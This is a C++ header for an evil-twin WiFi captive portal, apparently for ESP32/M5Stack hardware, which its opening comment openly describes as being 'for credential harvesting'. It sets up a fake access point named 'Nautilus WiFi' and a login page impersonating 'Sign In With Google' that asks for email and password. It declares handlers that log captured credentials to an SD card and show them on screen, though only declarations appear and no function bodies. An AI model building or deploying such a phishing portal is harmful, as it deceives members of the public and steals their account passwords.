// Nautilus Portal - WiFi Captive Portal for credential harvesting
// Based on NEMO Portal implementation
// https://github.com/marivaaldo/evil-portal-m5stack/

#pragma once

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "FS.h"
#include "SD.h"

#define DEFAULT_PORTAL_SSID "Nautilus WiFi"
#define PORTAL_CREDS_PATH "/portal/creds.txt"
#define PORTAL_JSON_PATH "/portal/post.json"
#define PORTAL_HTML_PATH "/portal/index.html"
#define PORTAL_POST_HTML_PATH "/portal/post.html"
#define LANGUAGE_EN_US 1

// Language definitions (English only by default)
#define LOGIN_TITLE "Sign in"
#define LOGIN_SUBTITLE "Sign In With Google"
#define LOGIN_EMAIL_PLACEHOLDER "Email"
#define LOGIN_PASSWORD_PLACEHOLDER "Password"
#define LOGIN_MESSAGE "Please log in to browse securely."
#define LOGIN_BUTTON "Next"
#define LOGIN_AFTER_MESSAGE "Please wait a few minutes. Soon you will be able to access the internet."

// Portal state
extern int totalCapturedCredentials;
extern int previousTotalCapturedCredentials;
extern String capturedCredentialsHtml;
extern bool portal_is_running;
extern String portalSsidName;

// Network settings
extern const byte HTTP_CODE;
extern const byte DNS_PORT;
extern IPAddress AP_GATEWAY;
extern unsigned long bootTime, lastActivity, lastTick, tickCtr;
extern DNSServer dnsServer;
extern WebServer webServer;

// Portal functions
void setupPortalWiFi();
void setupWebServer();
void shutdownWebServer();
void printPortalHomeToScreen();
String getHtmlContents(String body);
String getInputValue(String argName);

// HTTP handlers
String index_GET();
String index_POST();
String creds_GET();
String clear_GET();
String ssid_GET();
String ssid_POST();

// Portal control
void portal_start();
void portal_stop();
void portal_loop();

// SD card helpers
void appendToPortalFile(const char* path, const char* message);
bool loadCustomHtml(String& html);
bool loadCustomPostHtml(String& html);
